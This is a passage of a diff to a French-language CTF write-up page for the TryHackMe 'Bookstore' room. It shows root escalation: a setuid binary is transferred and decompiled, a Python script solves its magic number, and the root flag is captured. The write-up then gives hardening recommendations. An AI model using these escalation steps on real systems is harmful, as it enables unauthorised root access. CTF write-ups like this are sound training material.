-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/home/sid/try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ </span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ls -la /home/sid/try-harder</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">-rwsrwsr-x 1 root sid 8488 Oct 20  2020 /home/sid/try-harder</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ file /home/sid/try-harder</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/home/sid/try-harder: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a284afaae26d9772bb38113f55cd53608b4a29e, not stripped</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ </span>
+</code></code></pre></div></div>
 <p>Il s’agit d’un exécutable Linux au format ELF. Récupérons le pour l’analyser avec <code>ghidra</code> </p>
 <p>Sur la machine cible on lance un simple serveur python sur le port 1234</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">python3 -m http.server 1234</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 -m http.server 1234</span>
+</code></code></pre></div></div>
 <p>Sur notre machine on peut récupérer le fichier</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">wget http://bookstore.thm:1234/try-harder</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">wget http://bookstore.thm:1234/try-harder</span>
+</code></code></pre></div></div>
 <p>L’analyse du fichier ressors une fonction écrite en C</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">c</span><button class="copy-btn">Copier</button></div><pre><code class="language-c">void main(void)
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">c</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-c"><code class="language-c">void main(void)
 {
 long in_FS_OFFSET;
 uint local_1c;
@@ -405,9 +400,9 @@ __stack_chk_fail();
 }
 return;
 }
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Ce code nous demande un nombre magique et si il est correcte nous donne un accès root. Ce nombre est obtenu en faisant des calcul mais comme je ne suis pas très avancé en C j’ai utilisé un script python trouvé sur Google adapté à la situation. J’ai d’abord copié la fonction dans un fichier challenge.c. Voici le script python</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">python</span><button class="copy-btn">Copier</button></div><pre><code class="language-python">import re
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python"><code class="language-python">import re
 import sys
 
 def extraire_et_calculer(nom_fichier):
@@ -449,24 +444,24 @@ if __name__ == "__main__":
         print("Usage: python3 solveur.py &lt;nom_du_fichier.c&gt;")
     else:
         extraire_et_calculer(sys.argv[1])
-</code></pre></div>
+</code></code></pre></div></div>
 <p>En utilisant ce script on peut récupérer le nombre magic</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">python</span><button class="copy-btn">Copier</button></div><pre><code class="language-python">python3 solveur.py challenge.c
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python"><code class="language-python">python3 solveur.py challenge.c
 [*] Analyse de : challenge.c
 [*] Valeur cible identifiée : 0x5dcd21f4
 [-] Résultat Hex : 0x5dcd6d51
 [-] Résultat Décimal : 1573743953
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Le nombre magique est donc <code>1573743953</code>. On peut donc l’utiliser sur le système cible pour obtenir un accès root et récupérer le root flag</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sid@bookstore:~$ ./try-harder </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">What's The Magic Number?!</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">1573743953</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@bookstore:~# ls /root/</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root.txt  s</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@bookstore:~# cat /root/root.txt </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">e29b05fba5b2a7e69c24a450893158e3</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@bookstore:~# </span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ./try-harder </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">What's The Magic Number?!</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">1573743953</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@bookstore:~# ls /root/</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root.txt  s</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@bookstore:~# cat /root/root.txt </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">e29b05fba5b2a7e69c24a450893158e3</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">root@bookstore:~# </span>
+</code></code></pre></div></div>
 <p>⛳<strong>Root Flag</strong>: e29b05fba5b2a7e69c24a450893158e3</p>
 <h2 id="recommendations">Recommendations</h2>
 <ul>
@@ -477,53 +472,44 @@ if __name__ == "__main__":
 <li>Supprimer les scripts inutiles du système</li>
 <li>Préférer les whitelistes qui sont bien plus fiables que les blacklistes</li>
 </ul>
-
-      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
-        <a href="../writeups" class="btn btn-outline">← Tous les writeups</a>
-      </div>
-    </article>
-
-    <aside class="writeup-sidebar" style="position: sticky; top: 100px;">
-      <div class="sidebar-title">Table des matières</div>
-      <div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
-        <a href="#configuration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Configuration</a>
-<a href="#enumeration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Enumération</a>
-<a href="#exploration" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Exploration</a>
-<a href="#exploitation-de-la-lfi" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Exploitation de la LFI</a>
-<a href="#capture-user-flag" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Capture User Flag</a>
-<a href="#capture-root-flag" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Capture root flag</a>
-<a href="#recommendations" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Recommendations</a>
-
-      </div>
-      <hr style="border-color:var(--border);margin:1.5rem 0;"/>
-      <div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
-        <div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
-        <div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-medium">Medium</span></span></div>
-        <div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2026-02-03</span></div>
-      </div>
-    </aside>
-  </div>
+<div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+<a class="btn btn-outline" href="../writeups">← Tous les writeups</a>
+</div>
+</article>
+<aside class="writeup-sidebar" style="position: sticky; top: 100px;">
+<div class="sidebar-title">Table des matières</div>
+<div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
+<a class="toc-item" href="#configuration" style="display:block; text-decoration:none; padding:4px 0; ">Configuration</a>
+<a class="toc-item" href="#enumeration" style="display:block; text-decoration:none; padding:4px 0; ">Enumération</a>
+<a class="toc-item" href="#exploration" style="display:block; text-decoration:none; padding:4px 0; ">Exploration</a>
+<a class="toc-item" href="#exploitation-de-la-lfi" style="display:block; text-decoration:none; padding:4px 0; ">Exploitation de la LFI</a>
+<a class="toc-item" href="#capture-user-flag" style="display:block; text-decoration:none; padding:4px 0; ">Capture User Flag</a>
+<a class="toc-item" href="#capture-root-flag" style="display:block; text-decoration:none; padding:4px 0; ">Capture root flag</a>
+<a class="toc-item" href="#recommendations" style="display:block; text-decoration:none; padding:4px 0; ">Recommendations</a>
+</div>
+<hr style="border-color:var(--border);margin:1.5rem 0;"/>
+<div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
+<div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
+<div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-medium">Medium</span></span></div>
+<div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2026-02-03</span></div>
+</div>
+<br/><br/><div class="sidebar-title">Recently Updated</div><div style="display:flex; flex-direction:column; gap:0.5rem;"><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: Operation Endgame</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: AoC 2025 Side Quest Four</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: AoC 2025 Side Quest Two</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: Padelify</a></div><br/><div class="sidebar-title">Trending Tags</div><div style="display:flex; gap:0.5rem; flex-wrap:wrap;"><span class="tag" style="font-size: 0.8rem;">web</span><span class="tag" style="font-size: 0.8rem;">wordpress</span><span class="tag" style="font-size: 0.8rem;">rce</span><span class="tag" style="font-size: 0.8rem;">php</span><span class="tag" style="font-size: 0.8rem;">mysql</span><span class="tag" style="font-size: 0.8rem;">hash</span></div></aside>
+</div>
 </div>
 </section>
 </main>
-
-<footer><div class="container"><div class="footer-inner">
-  <div class="footer-name">&gt;_ alex171-studo</div>
-  <div class="footer-links"><a href="../writeups">Writeups</a><a href="../index">Accueil</a></div>
-  <div class="footer-copy">© 2026 Alex171-studo</div>
-</div></div></footer>
-
-<div id="interactive-terminal" class="terminal-window">
-  <div class="terminal-titlebar">
-    <div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
-    <span class="terminal-title">Terminal interactif</span>
-    <button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
-  </div>
-  <div class="term-interactive-body" id="term-output"></div>
-  <div class="term-input-line">
-    <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
-    <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off" spellcheck="false"/>
-  </div>
+<footer><div class="container"><div class="footer-inner" style="display:flex; justify-content: space-between; font-size: 0.9rem; color: var(--text-muted);"><div>© 2026 jaxafed. Some rights reserved.</div><div>Using the Chirpy theme for Jekyll.</div></div></div></footer>
+<div class="terminal-window" id="interactive-terminal">
+<div class="terminal-titlebar">
+<div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
+<span class="terminal-title">Terminal interactif</span>
+<button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+</div>
+<div class="term-interactive-body" id="term-output"></div>
+<div class="term-input-line">
+<span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
+<input autocomplete="off" class="term-input" id="term-input" placeholder="help" spellcheck="false" type="text"/>
+</div>
 </div>
 <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
 <script src="../js/main.js"></script>
